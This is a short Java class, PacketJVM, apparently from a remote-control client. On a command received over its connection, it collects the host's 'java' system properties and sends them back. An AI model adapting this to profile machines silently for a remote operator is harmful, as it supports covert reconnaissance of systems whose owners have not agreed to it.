package com.redpois0n.packets.in;

import java.util.Set;

import com.redpois0n.Connection;
import com.redpois0n.packets.out.Header;


public class PacketJVM extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<Object> keys = System.getProperties().keySet();
		for (Object obj : keys) {
			if (obj.toString().toLowerCase().startsWith("java")) {
				Connection.addToSendQueue(new PacketBuilder(Header.JAVA_PROPERTIES, new String[] { obj.toString(), System.getProperty(obj.toString()) }));
			}
		}
	}

}
